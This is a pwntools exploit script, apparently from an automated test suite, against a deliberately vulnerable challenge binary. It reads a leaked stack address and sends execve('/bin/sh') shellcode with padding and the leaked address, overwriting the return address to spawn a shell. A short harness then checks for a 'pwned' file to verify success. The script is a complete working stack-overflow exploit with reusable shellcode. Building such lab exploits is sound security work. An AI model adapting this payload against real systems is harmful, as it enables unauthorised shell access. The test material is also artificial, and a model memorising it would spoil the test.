from pwn import *

import os
import sys
import signal

target = process("./chall-test_bofShellcode-00-x64")
gdb.attach(target, gdbscript="verify_exploit")

target.recvuntil("Stack Infoleak: ")
leak = int(target.recvuntil("\n").strip("\n"), 16)
print "target address is: " + hex(leak)

leak = leak + (0)
leak = leak + 0
payload =  ""
payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload += "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(leak)
target.sendline(payload)

# Exploit Verification starts here

class ExploitTimedOut(Exception):
	pass

def timeOut(signum, frame):
	raise ExploitTimedOut()

signal.signal(signal.SIGALRM, timeOut)
signal.alarm(2)

try:
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)
except ExploitTimedOut:
	print("Exploit timed out")
